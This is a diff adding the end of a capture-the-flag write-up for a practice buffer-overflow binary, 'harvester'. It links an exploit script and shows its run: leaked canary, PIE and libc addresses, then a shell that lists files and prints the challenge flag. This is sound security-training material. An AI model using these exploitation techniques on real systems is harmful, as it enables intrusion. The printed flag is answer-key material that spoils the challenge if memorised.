@@ -436,6 +436,47 @@ With that ready i need a pop_rdi gadget to pop the value of sh in system also i 
 
 So here's my exploit script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/practice/harvest_exploit.py)
 
+Running it works 👻
+
+```
+┌──(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/harvester]
+└─$ python3 exploit.py                                              
+[+] Starting local process './harvester': pid 30985
+[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Canary address: 0x38d5ddbf06eb8b00
+[*] Leaked Pie address: 0x555555400f90
+[*] Piebase address: 0x555555400000
+[*] Leaked nano address: 0x7ffff7e98390
+[*] Libc base address 0x7ffff7dc46a0
+[*] /bin/sh address 0x7ffff7f5a6d1
+[*] System address 0x7ffff7e109d0
+[*] Switching to interactive mode
+$ ls -al
+total 2032
+drwxr-xr-x  2 mark mark    4096 Mar  2 00:07 .
+drwxr-xr-x 31 mark mark    4096 Mar  2 00:05 ..
+-rw-------  1 mark mark    1418 Mar  2 00:07 .gdb_history
+-rw-r--r--  1 mark mark    3802 Mar  1 16:40 exploit.py
+-rw-r--r--  1 mark mark      37 Mar  1 14:18 flag.txt
+-rw-r--r--  1 mark mark    1653 Mar  1 23:24 fuzz.py
+-rwxr-xr-x  1 mark mark   20761 Mar  2 00:06 harvester
+-rw-r--r--  1 mark mark 2030928 Mar  2 00:04 libc.so.6
+$ cat flag.txt
+CHTB{h4rv35t3r_15_ju5t_4_b1g_c4n4ry}
+$ 
+```
+
+And we're done 
+
+<br> <br>
+[Back To Home](../../index.md)
+
+
 
 
 
